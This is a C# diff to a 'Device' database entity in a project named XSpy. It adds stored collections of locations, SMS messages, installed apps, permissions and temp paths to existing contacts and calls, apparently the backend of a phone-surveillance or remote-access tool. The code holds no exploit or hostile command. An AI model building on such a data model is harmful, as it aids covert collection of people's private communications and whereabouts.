@@ -20,7 +20,12 @@ namespace XSpy.Database.Entities.Devices
 
         private User _userData;
         private ICollection<Contact> _contacts;
+        private ICollection<Location> _locations;
         private ICollection<Call> _calls;
+        private ICollection<InstalledApps> _apps;
+        private ICollection<Sms> _messages;
+        private ICollection<Permission> _permissions;
+        private ICollection<TempPath> _tempPaths;
         [Key, Column("id")] public Guid Id { get; set; }
 
         [Column("user_id"), ForeignKey(nameof(UserData))]
@@ -35,6 +40,7 @@ namespace XSpy.Database.Entities.Devices
         [Column("sys_version"), MaxLength(30)] public string SystemVersion { get; set; }
         [Column("last_ip"), MaxLength(45)] public string LastIp { get; set; }
         [Column("is_online")] public bool IsOnline { get; set; }
+        [Column("is_loading_dir")] public bool IsLoadingDir { get; set; }
 
         [Column("added_at")] public DateTime AddedAt { get; set; }
         [Column("updated_at")] public DateTime UpdatedAt { get; set; }
@@ -52,10 +58,40 @@ namespace XSpy.Database.Entities.Devices
             set => _contacts = value;
         }
 
+
+        public ICollection<Location> Locations
+        {
+            get => LazyLoader.Load(this, ref _locations);
+            set => _locations = value;
+        }
+
         public ICollection<Call> Calls
         {
             get => LazyLoader.Load(this, ref _calls);
             set => _calls = value;
+        }
+
+        public ICollection<InstalledApps> Apps
+        {
+            get => LazyLoader.Load(this, ref _apps);
+            set => _apps = value;
+        }
+
+        public ICollection<Sms> Messages
+        {
+            get => LazyLoader.Load(this, ref _messages);
+            set => _messages = value;
+        }
+
+        public ICollection<Permission> Permissions
+        {
+            get => LazyLoader.Load(this, ref _permissions);
+            set => _permissions = value;
+        }
+        public ICollection<TempPath> TempPaths
+        {
+            get => LazyLoader.Load(this, ref _tempPaths);
+            set => _tempPaths = value;
         }
     }
 }
